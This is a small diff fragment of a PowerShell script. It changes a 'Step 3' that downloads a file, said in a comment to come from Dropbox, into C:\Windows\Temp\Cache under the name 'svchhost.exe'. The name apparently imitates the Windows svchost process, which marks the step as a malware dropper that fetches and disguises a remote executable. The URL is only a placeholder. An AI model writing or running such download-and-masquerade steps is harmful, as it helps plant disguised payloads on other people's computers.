@@ -14,7 +14,7 @@ try {
 # Step 3: Download the file from Dropbox to C:\Windows\Temp\Cache
 try {
     $hookurl = "dc"
-    Invoke-WebRequest -Uri "dc" -OutFile "$env:windir\temp\Cache\svchhost.exe" -ErrorAction Stop
+    Invoke-WebRequest -Uri $hookurl -OutFile "$env:windir\temp\Cache\svchhost.exe" -ErrorAction Stop
     Write-Host "File downloaded successfully to C:\Windows\Temp\Cache."
 } catch {
     Write-Host "Failed to download file: $_"
